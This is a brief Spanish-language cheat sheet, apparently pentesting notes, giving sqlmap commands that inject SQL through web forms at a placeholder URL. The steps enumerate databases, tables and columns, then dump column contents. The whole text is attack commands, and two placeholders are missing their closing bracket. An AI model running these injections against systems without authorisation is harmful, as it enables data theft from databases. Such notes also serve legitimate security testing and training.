# SQLi en Formulario
## Encontrar las bases de datos existentes
```bash
sqlmap -u <"URL"> --forms --dbs --batch
```

## Encontrar las tablas de una base de datos existente
```bash
sqlmap -u <"URL"> --forms -D <"Nombre de la base de datos"> --tables --batch
```

## Encontrar las columnas de una tabla de una base de datos existente
```bash
sqlmap -u <"URL"> --forms -D <"Nombre de la base de datos"> -T <"Nombre de la tabla" --columns --batch
```

## Mostrar los campos de las columnas de una tabla de una base de datos existente
```bash
sqlmap -u <"URL"> --forms -D <"Nombre de la base de datos"> -T <"Nombre de la tabla" -C <"Nombre de las columnas a mostar, separadas por coma"> --dump --batch
```